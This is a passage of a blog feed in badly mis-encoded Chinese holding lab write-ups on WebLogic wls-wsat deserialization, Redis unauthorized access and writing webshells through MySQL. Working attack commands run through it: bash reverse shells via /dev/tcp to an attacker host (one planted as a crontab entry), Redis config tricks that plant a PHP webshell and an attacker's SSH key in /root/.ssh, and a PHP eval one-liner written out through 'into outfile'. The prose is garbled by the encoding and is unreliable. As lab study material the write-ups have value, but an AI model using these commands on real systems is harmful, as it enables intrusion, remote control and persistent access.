src="https://img-blog.csdnimg.cn/cea48ea1720d482daff11874f9990886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_50,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆåŠŸåå¼¹shellï¼ŒæœåŠ¡å™¨æ‰§è¡Œäº†æˆ‘ä»¬ä¼ å…¥çš„<br>/bin/bash -c bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1<br><img src="https://img-blog.csdnimg.cn/04d240f521704714b7b9f219bfbd052d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>æ¼æ´åˆ©ç”¨çš„è¿‡ç¨‹å¾ˆç®€å•<br>æœ‰ä¸¤ä¸ªç–‘é—®ç‚¹</p><blockquote><p>1.wls-wsatç»„ä»¶å¦‚ä½•å¤„ç†xmlæ•°æ®<br>2.é€ æˆååºåˆ—åŒ–æ¼æ´çš„å…³é”®ç‚¹åœ¨å“ª</p></blockquote><p>å°è¯•ä¼ å…¥ä»»æ„å‘½ä»¤<br><img src="https://img-blog.csdnimg.cn/9be705e77d9448ada8c5aedf7d85f6ef.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_16,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨å“åº”ä¸­çœ‹åˆ°äº†è¿”å›çš„xmlæ•°æ®ä»¥åŠæ•´ä¸ªå¤„ç†è¿‡ç¨‹çš„è°ƒç”¨æ ˆ<br><img src="https://img-blog.csdnimg.cn/ab02563a2f654b6ea14cb3a14fad86d4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_47,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/89e4eb4967994b0ba45f623017f2c74b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯ä»¥çœ‹åˆ°å¤„ç†è¿‡ç¨‹æœ€åè°ƒç”¨äº†<code>java.beans.XMLDecoder</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç”¨äºå°†XMLæ•°æ®ååºåˆ—åŒ–ä¸ºjavaå¯¹è±¡ï¼Œè¿™é‡Œé€ æˆäº†æ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œ</p><p>æ ¹æ®<a href="https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic%20WLS-WebServices%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.md">vulhubæä¾›çš„æŠ€æœ¯æ–‡æ¡£</a>ã€å‚è€ƒ<a href="https://blog.51cto.com/skytina/2055335">å¤§ä½¬çš„åˆ†æè¿‡ç¨‹</a>å¯ä»¥å¾—çŸ¥å¤§è‡´çš„å¤„ç†è¿‡ç¨‹<br><img src="https://img-blog.csdnimg.cn/img_convert/4e4c200cb59a992165ce7d99a8095563.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><blockquote><p>1.æ ¹æ®POCï¼Œå½“æˆ‘ä»¬ä¼ å…¥&#60;&#115;&#111;&#97;&#112;&#101;&#110;&#118;&#62;æ ‡ç­¾åŒ…è£¹çš„æ•°æ®æ—¶ï¼Œwls-wsatä½¿ç”¨äº†weblogicè‡ªå¸¦çš„webserviceså¤„ç†ç¨‹åºæ¥å¤„ç†SOAPè¯·æ±‚<br>2.è¯¥å¤„ç†ç¨‹åºé¦–å…ˆè°ƒç”¨weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequestæ–¹æ³•è·å–åˆ°æˆ‘ä»¬ä¼ å…¥çš„xmlæ•°æ®ä¸ºvar1ï¼Œå®šä¹‰var2ä¸ºå¤„ç†è¿‡çš„var1æ•°æ®<br>3.é€šè¿‡var2.get()æ–¹æ³•ä¸­çš„WorkAreaConstants.WORK_AREA_HEADERå‚æ•°è·å–&lt;work:WorkContext &gt;æ ‡ç­¾ä¸­çš„å†…å®¹<br>4.å½“var3ä¸ä¸ºç©ºæ—¶ï¼Œæ‰§è¡ŒreadHeaderOld(var3);</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/6a83462617931a7657bdcea01cb87b7d.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><blockquote><p>5.åœ¨readHeaderOldä¸­ï¼Œå®ä¾‹åŒ–äº†WorkContextXmlInputAdapterï¼Œæ­¤æ—¶æ–¹æ³•å†…çš„var4æ˜¯javaæ ‡ç­¾é‡Œçš„å†…å®¹</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/010303fb6e49b8294420c3f88aa6d98e.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><blockquote><p>6.åœ¨å®ä¾‹åŒ–WorkContextXmlInputAdapterä¸­ï¼Œç›´æ¥è°ƒç”¨xmlDecoderååºåˆ—åŒ–ä¼ å…¥çš„xmlæ•°æ®ï¼Œä¹Ÿå°±æ˜¯å¤„ç†è¿‡çš„var4</p></blockquote><p>ä»æ•´ä¸ªè¿‡ç¨‹ä¸­å¯ä»¥å‘ç°ï¼Œä¼ å…¥çš„xmlæ•°æ®ä»å§‹è‡³ç»ˆéƒ½æ²¡æœ‰å—åˆ°ä»»ä½•è¿‡æ»¤ï¼Œwls-wsatçš„ç±»ä¼¼å‰¥æ´‹è‘±çš„å¤„ç†æ–¹å¼ä¸€å±‚ä¸€å±‚æ­å¼€æœ€åç›´æ¥ååºåˆ—åŒ–ï¼Œè¿™æ ·æ˜¾ç„¶æ˜¯å¾ˆä¸å®‰å…¨æ»´ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;å•¥æ˜¯weblogic&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;WebLogicæ˜¯Oracleå‘å¸ƒçš„ä¸€ä¸ªåŸºäºJAVAEEæ¶æ„çš„webä¸­é—´ä»¶&lt;br&gt;å¤§æ¦‚å¯ä»¥ç†è§£ä¸ºtomcat pro maxğŸ™ƒ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;st</summary>
      
    
    
    
    <category term="webæ¼æ´" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="ååºåˆ—åŒ–æ¼æ´" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="ååºåˆ—åŒ–æ¼æ´" scheme="https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="weblogicååºåˆ—åŒ–" scheme="https://redredredfish.github.io/tags/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>redisæœªæˆæƒè®¿é—®</title>
    <link href="https://redredredfish.github.io/2021/07/07/helloworld/"/>
    <id>https://redredredfish.github.io/2021/07/07/helloworld/</id>
    <published>2021-07-07T08:05:00.000Z</published>
    <updated>2021-12-06T03:10:31.762Z</updated>
    
    <content type="html"><![CDATA[<h2 id="redisæœªæˆæƒè®¿é—®çš„åˆ©ç”¨æ–¹å¼"><a href="#redisæœªæˆæƒè®¿é—®çš„åˆ©ç”¨æ–¹å¼" class="headerlink" title="redisæœªæˆæƒè®¿é—®çš„åˆ©ç”¨æ–¹å¼"></a>redisæœªæˆæƒè®¿é—®çš„åˆ©ç”¨æ–¹å¼</h2><p><strong>æ¼æ´åŸç†ï¼š</strong><br>    Redis&lt;3.2é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨0.0.0.0:6379ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„å®‰å…¨ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™é»‘ç™½åå•ç­‰ç­‰ï¼Œè¿™æ ·ä¼šå°†RedisæœåŠ¡æš´éœ²åœ¨å…¬ç½‘ä¸Šã€‚<br>å¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç (é»˜è®¤ä¸ºç©º)çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·å¯ä»¥æœªæˆæƒè®¿é—®Redisä»¥åŠè¯»å–Redisçš„æ•°æ®ã€‚æ”»å‡»è€…åˆ©ç”¨Redisè‡ªèº«çš„æä¾›çš„configå‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œè¿˜å¯ä»¥å°†sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨./root/.sshä¸‹çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥åˆ©ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡å™¨ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚<br>æ¼æ´çš„äº§ç”Ÿæ¡ä»¶æœ‰ä»¥ä¸‹ä¸¤ç‚¹:</p><ol><li>Redisç»‘å®šåœ¨0.0.0.0:6379,ä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘</li><li>æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯æˆ–è€…å¼±å¯†ç ï¼Œå¯ä»¥å…å¯†ç™»å½•redisæœåŠ¡</li></ol><p><strong>æ¼æ´å¤ç°ï¼š</strong><br>ç¯å¢ƒï¼š</p><ol><li>æ”»å‡»æœºkali5.7.0 192.168.237.132</li><li>é¶æœº1 Ubuntu16.04 192.168.237.128</li><li>é¶æœº2 centOS7 192.168.237.133</li><li>redis 2.8.17</li></ol><p>é¶æœº1å¼€å¯redis-serverï¼Œæ”»å‡»æœº<code>./redis-cli -h</code> å°è¯•è¿æ¥<br>ç”±äºé¶æœº1æ²¡æœ‰å¼€å¯å®‰å…¨ç­–ç•¥ä¸”é»˜è®¤æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯<br>é€ æˆæ”»å‡»æœºå¯ä»¥æœªæˆæƒè®¿é—®ä¸”æ‰§è¡Œå‘½ä»¤è·å–æ•æ„Ÿæ•°æ®<br> <img src="https://img-blog.csdnimg.cn/6873e9d4e3da45ba88666a1477187c5d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>åˆ©ç”¨æ–¹å¼ä¸€ï¼šwebshell</strong><br>æ”»å‡»æœºè¿›è¡Œæœªæˆæƒè®¿é—®ï¼Œåˆ©ç”¨redisçš„<code>config set</code>å‘½ä»¤å°†webshellå†™å…¥é¶æœº2ç½‘ç«™ç›®å½•ä¸‹(*Redis Config Set å‘½ä»¤å¯ä»¥åŠ¨æ€åœ°è°ƒæ•´ Redis æœåŠ¡å™¨çš„é…ç½®)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir <span class="comment">#è®¾ç½®è·¯å¾„</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename <span class="comment">#è®¾ç½®æ–‡ä»¶å</span></span><br><span class="line"><span class="built_in">set</span> webshell <span class="comment">#å†™å…¥keyå€¼â€œwebshellâ€å¯¹åº”çš„å€¼</span></span><br><span class="line">save <span class="comment">#å°†æ‰€æœ‰keyå€¼ä¿å­˜åœ¨æ–‡ä»¶ä¸­</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/4794579e300c4dfbb8f128fc45613b8a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åœ¨é¶æœº2ä¸ŠæŸ¥çœ‹å·²ç»å†™å…¥äº†shell.phpæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/13f46d7fdf2f477aa1f1b43080e35291.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æµè§ˆå™¨è®¿é—®<code>http://é¶æœº2/shell.php</code>,å‘ç°æˆåŠŸå†™å…¥webshell<br><img src="https://img-blog.csdnimg.cn/0135013b3df04785ac006a4a0b7192d9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åŒç†å¯å†™å…¥ä¸€å¥è¯æœ¨é©¬<br><code>\n\n\n</code>æ¢è¡Œé¿å…å› &lt;?å¯¼è‡´shellæ— æ³•è§£æ<br><img src="https://img-blog.csdnimg.cn/59b4b9b17924407ab064db617a35c649.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>èœåˆ€æˆåŠŸè¿æ¥<br><img src="https://img-blog.csdnimg.cn/c48cc4e5dae5436a8bce15d65c02e49b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>åˆ©ç”¨æ–¹å¼äºŒï¼šå†™å…¥SSHå…¬é’¥å®ç°SSHç™»å½•</strong><br>å°†æ”»å‡»æœºæœ¬æœºçš„å…¬é’¥ä½œä¸ºvalueï¼Œç„¶åé€šè¿‡ä¿®æ”¹redisçš„é»˜è®¤è·¯å¾„ä¸º/root/.sshå’Œé»˜è®¤çš„ç¼“å†²æ–‡ä»¶authorized.keys,æŠŠç¼“å†²çš„æ•°æ®ä¿å­˜åœ¨æ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å¯ä»¥åœ¨é¶æœº2çš„/root/.sshä¸‹ç”Ÿä¸€ä¸ªæˆæƒçš„keyï¼Œä»è€Œé€šè¿‡sshç™»å½•é¶æœº2ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa <span class="comment">#ç”Ÿæˆsshå…¬é’¥å’Œç§é’¥,é»˜è®¤å¯†ç ä¸ºç©º</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20e1056957864553a16b1efd5814267a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/947e26f0a96c4c779af4658604df15f8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å°†ç”Ÿæˆçš„å…¬é’¥ä¿å­˜åˆ°ssh.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; ssh.txt</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/aa0c918525c54c3f9607a4b20548e324.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å°†ä¿å­˜çš„å…¬é’¥ssh.txtå†™å…¥é¶æœº2 redisçš„keyå€¼sshä¸­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/.ssh/ssh.txt | redis-cli -h é¶æœº2 -x <span class="built_in">set</span> ssh</span><br></pre></td></tr></table></figure><p> <img src="https://img-blog.csdnimg.cn/f55a4e2ef0a349adbd682cca94433854.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿œç¨‹ç™»å½•é¶æœº2çš„redisæœåŠ¡ï¼Œæ›´æ”¹rediså¤‡ä»½è·¯å¾„ä¸ºsshå…¬é’¥å­˜æ”¾ç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /root/.ssh</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d6a29e85e7804d6192eec815d17c73ac.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è®¾ç½®ä¸Šä¼ å…¬é’¥çš„å¤‡ä»½æ–‡ä»¶åå­—ä¸º<code>authorized_keys</code>,ä¿å­˜ä¸Šä¼ <br><img src="https://img-blog.csdnimg.cn/39146a0f6f19408fb1fbe034113f9db3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ”»å‡»æœºä½¿ç”¨sshå…å¯†ç™»å½•é¶æœº2<br><img src="https://img-blog.csdnimg.cn/423ff5f4b3ab410a82c7a6dbad4348ab.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æˆåŠŸç™»å½•é¶æœº2<br><img src="https://img-blog.csdnimg.cn/e59317f4123d47f0916bceceab38c166.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>åˆ©ç”¨æ–¹å¼ä¸‰ï¼šcrontabå®šæ—¶ä»»åŠ¡ï¼Œåå¼¹shell</strong><br>æ”»å‡»æœºç›‘å¬9999ç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l ç«¯å£</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/814ecd57633b4f3b8ac28290b13b2dd2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿œç¨‹ç™»å½•redisï¼Œå†™å…¥å®šæ—¶ä»»åŠ¡ï¼Œä¸€åˆ†é’Ÿåæ‰§è¡Œbashåå¼¹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">test</span> <span class="string">&quot;\n\n*/1 * *  * * /bin/bash -i&gt;&amp;/dev/tcp/æ”»å‡»æœº/ç›‘å¬ç«¯å£ 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron</span><br><span class="line">config <span class="built_in">set</span> dbfilename <span class="built_in">test</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/8224058e9d40426db4d609b5924ebff2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åå¼¹shellæˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/2fd620c007a64ee4b7a2e6a97a8434be.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>åˆ©ç”¨æ–¹å¼å››ï¼šæ‰§è¡Œluaè„šæœ¬</strong><br>Redisåœ¨2.6æ¨å‡ºäº†è„šæœ¬åŠŸèƒ½ï¼Œå…è®¸å¼€å‘è€…ä½¿ç”¨luaè¯­è¨€ç¼–å†™è„šæœ¬ä¼ åˆ°Redisä¸­<br>æ‰§è¡Œã€‚æš‚æ—¶è¿˜æ²¡æ‰¾åˆ°æ€ä¹ˆåˆ©ç”¨luaæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><p>ç¼–å†™luaè„šæœ¬test.luaè¾“å‡ºå­—ç¬¦hello,world!</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> a = <span class="string">&quot;hello,world!&quot;</span></span><br><span class="line"><span class="keyword">return</span> a</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/3554ae78db6a4fb793899e17f0416f02.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>redis-cli â€“eval test.lua -h é¶æœº2<br><img src="https://img-blog.csdnimg.cn/175b98fe97a34b1a86f966a6f3517de8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;redisæœªæˆæƒè®¿é—®çš„åˆ©ç”¨æ–¹å¼&quot;&gt;&lt;a href=&quot;#redisæœªæˆæƒè®¿é—®çš„åˆ©ç”¨æ–¹å¼&quot; class=&quot;headerlink&quot; title=&quot;redisæœªæˆæƒè®¿é—®çš„åˆ©ç”¨æ–¹å¼&quot;&gt;&lt;/a&gt;redisæœªæˆæƒè®¿é—®çš„åˆ©ç”¨æ–¹å¼&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;æ¼æ´åŸç†ï¼š&lt;/str</summary>
      
    
    
    
    <category term="webæ¼æ´" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="æœªæˆæƒè®¿é—®æ¼æ´" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="redisæœªæˆæƒè®¿é—®" scheme="https://redredredfish.github.io/tags/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
    <category term="æœªæˆæƒè®¿é—®æ¼æ´" scheme="https://redredredfish.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Mysqlå†™shellçš„å‡ ç§æ–¹å¼</title>
    <link href="https://redredredfish.github.io/2021/07/06/Mysql%E5%86%99shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
    <id>https://redredredfish.github.io/2021/07/06/Mysql%E5%86%99shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</id>
    <published>2021-07-06T03:04:00.000Z</published>
    <updated>2021-12-08T08:19:13.390Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Mysqlå†™shellçš„å‡ ç§æ–¹å¼"><a href="#Mysqlå†™shellçš„å‡ ç§æ–¹å¼" class="headerlink" title="Mysqlå†™shellçš„å‡ ç§æ–¹å¼"></a><strong>Mysqlå†™shellçš„å‡ ç§æ–¹å¼</strong></h2><p>å½“æˆ‘ä»¬æ‹¿åˆ°æ•°æ®åº“æƒé™æ—¶ï¼Œå¯é€šè¿‡æ•°æ®åº“ç®¡ç†å·¥å…·å†™å…¥shellåˆ°ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼Œåˆ©ç”¨shellæ§åˆ¶ç›®æ ‡æœåŠ¡å™¨ã€‚</p><p><strong>å¤ç°ç¯å¢ƒï¼š</strong><br>phpstudy_pro 8.1.0.6<br>mysql 5.7.26 rootæƒé™<br>           ç½‘ç«™ç»å¯¹è·¯å¾„ä¸ºD:\phpstudy_pro\WWW</p><p>   <strong>åˆ©ç”¨æ–¹å¼ï¼š</strong></p><ol><li>é€šè¿‡<code>outfile</code>å†™å…¥shell<br>å°è¯•é€šè¿‡outfileå†™å…¥æ–‡ä»¶ </li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æŠ¥é”™[<span class="type">Code</span>: <span class="number">1290</span>, <span class="type">SQL</span> <span class="type">State</span>: <span class="type">HY000</span>]The MySQL server is running with the â€“secure<span class="operator">-file</span><span class="literal">-priv</span> option so it cannot execute this statement</span><br></pre></td></tr></table></figure><p> ç™¾åº¦ä¹‹åæ‰¾åˆ°åŸå› ï¼šmysql 5.6.34ç‰ˆæœ¬ä»¥å <code>secure_file_priv</code>çš„å€¼é»˜è®¤ä¸ºNULLï¼Œé™åˆ¶æ— æ³•å¯¼å…¥å’Œå¯¼å‡ºæ–‡ä»¶</p><p>   è§£å†³åŠæ³•ï¼šåœ¨my.inié…ç½®æ–‡ä»¶[mysqld]ä¸‹æ·»åŠ <code>secure_file_priv =&quot;&quot;</code>ä½¿å…¶é»˜è®¤ä¸ºç©º<br>   <img src="https://img-blog.csdnimg.cn/70497d772f4c4ba2b573352f25dae7a8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>   æ–°å»ºæŸ¥è¯¢select</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;?php  @eval($_POST[1]);?&gt;&#x27;</span> into outfile</span><br><span class="line"><span class="string">&#x27;D:/phpstudy_pro/WWW/shell.php&#x27;</span>;ï¼ŒæˆåŠŸå†™å…¥shell.phpæ–‡ä»¶  </span><br></pre></td></tr></table></figure><p>   <img src="https://img-blog.csdnimg.cn/f79f35a5ba554bd094273ff47937fd24.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>   èšå‰‘è¿æ¥<code>http://localhost:122/shell.php</code>æˆåŠŸ<br> <img src="https://img-blog.csdnimg.cn/9ef8af7928304a1fa0bae9f9f23c8e6a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ol start="2"><li>å‘è¡¨æ’å…¥shellå¹¶æŸ¥è¯¢å¯¼å‡º<br>å°†ä¸€å¥è¯æœ¨é©¬ä½œä¸ºæ•°æ®æ’å…¥test1è¡¨usernameå­—æ®µä¸­ </li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into`test1`(`username`) values (<span class="string">&#x27;&lt;?php  @eval($_POST[1]);?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>   <img src="https://img-blog.csdnimg.cn/91bac466134a4bb3acd8333fa95afeb4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/0a7e3aab22b44c73b0eda03f49cedc6a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>   æŸ¥è¯¢è¯¥æ•°æ®å¹¶å¯¼å‡ºåˆ°shell.php </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">select</span> username from test1 into outfile <span class="string">&#x27;D:/phpstudy_pro/WWW/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p> <img src="https://img-blog.csdnimg.cn/da32a5781ab64cfaa087b6d3ee6d3d59.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>   èšå‰‘è¿æ¥<code>http://localhost:122/shell.php</code>æˆåŠŸ<br>   <img src="https://img-blog.csdnimg.cn/e201c8e019154fc698254e00c89fd436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ol start="3"><li>å¼€å¯å…¨å±€æ—¥å¿—å†™å…¥shell<br>é¦–å…ˆæŸ¥çœ‹å…¨å±€æ—¥å¿—æ˜¯å¦å¼€å¯ </li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;%general%&#x27;</span>;  </span><br></pre></td></tr></table></figure><p>  